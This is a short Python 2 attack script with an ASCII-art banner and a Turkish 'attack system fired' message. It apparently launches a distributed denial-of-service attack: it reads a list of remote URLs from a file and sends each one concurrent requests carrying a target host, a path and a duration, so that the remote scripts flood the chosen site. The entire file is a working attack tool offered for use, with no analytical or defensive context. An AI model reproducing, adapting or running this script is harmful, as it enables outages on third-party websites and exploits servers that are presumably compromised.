# exp: obus.py site.org index.php 9999
import grequests
import sys
obusv1 = """\
   [ O ]
     \ \      p
      \ \  \o/
       \ \--'---_
       /\ \   / ~~\_
 ./---/__|=/_/------//~~~\               Coded By 4ntidot3
/___________________/O   O \           Using Python 2.7 & Delphi
(===(\_________(===(Oo o o O)          
 \~~~\____/     \---\Oo__o--
   ~~~~~~~       ~~~~~~~~~~
"""
print obusv1
print("Saldiri Sistemi Ateslenmistir..")
urls=[line.strip() for line in open('http.txt')]
rs = (grequests.get(u+"?host="+sys.argv[1]+"&dizin="+sys.argv[2]+"&time="+sys.argv[3]) for u in urls)
grequests.map(rs)